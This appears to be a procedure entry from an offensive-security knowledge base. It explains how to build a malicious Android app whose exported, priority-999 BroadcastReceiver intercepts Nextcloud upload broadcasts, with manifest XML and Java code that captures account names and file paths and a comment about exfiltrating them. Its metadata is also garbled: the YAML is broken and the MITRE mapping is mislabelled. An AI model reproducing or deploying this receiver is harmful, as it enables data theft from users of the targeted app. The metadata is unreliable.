---
tags:
  - android
  - malware-development
  - broadcast-receiver
type: procedure
tools:
  - '[[tools/Android-Studio]]'
tactics:
  - '[[Persistence]]'
  - 'techniques: ['
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.247Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
"[[T1543.002]] Create or Modify System Process: System Script\n        ": 'sub_techniques: []'
id: 47249077-da18-4fce-9e1f-d638ee1b6e9c
validated: true
mitre_tactics:
  - '[[Persistence]]'
  - 'techniques: ['
---
# Implement-Malicious-Broadcast-Receiver-in-Android-App

## Summary

This procedure details creating a malicious Android application that registers an exported, high-priority BroadcastReceiver to intercept sticky broadcasts from the Nextcloud app, allowing priority-based data capture.

## Description

Android broadcasts can be intercepted by any app with a matching exported receiver. By setting a high priority (e.g., 999), the malicious receiver processes intents first. This targets apps using sendStickyBroadcast without security, extracting extras like file info via Intent.getExtras(). Prerequisites include Android development setup; outcomes enable real-time data theft on shared devices.

## Requirements

1. Android Studio installed
2. Android SDK for target API level (e.g., 30+)
3. Device or emulator for testing

## Defense

Defensive measures and detection strategies:

- Restrict broadcasts with custom permissions
- Monitor for high-priority receivers via app analysis
- Use runtime protections like Google Play Protect to flag suspicious APKs

## Objectives

1. Register exported receiver for Nextcloud actions
2. Prioritize interception over legitimate app
3. Prepare for data extraction in onReceive

## Instructions

### Step 1: Create New Android Project

**Context**: Set up a basic app skeleton in Android Studio.

Launch Android Studio, create Empty Activity project, target API 21+.

### Step 2: Define Receiver in Manifest

**Context**: Export and prioritize the receiver to match broadcast actions.

Edit AndroidManifest.xml:

```xml
<receiver android:name=".MaliciousReceiver"
          android:exported="true"
          android:enabled="true">
    <intent-filter android:priority="999">
        <action android:name="com.owncloud.android.files.services.FileUploader$UploadStatus" />
        <!-- Add other actions: UPLOAD_START, UPLOAD_FINISH, UPLOADS_ADDED -->
    </intent-filter>
</receiver>
```

### Step 3: Implement Receiver Logic

**Context**: Handle incoming intents to capture and process data.

Create MaliciousReceiver.java:

```java
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MaliciousReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras != null) {
            String account = extras.getString("account");
            String filePath = extras.getString("filePath");
            int status = extras.getInt("status");
            Log.d("MaliciousIntercept", "Account: " + account + ", File: " + filePath + ", Status: " + status);
            // Exfiltrate via network if needed
        }
    }
}
```

Build and install APK.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Systemd Service]] Create or Modify System Process: System Script

### Sub-Techniques


## Commands Used


## Tools Used

- [[Android Studio]]

## Tags

- [[android]]
- [[broadcast-receiver]]
- [[Malware]]
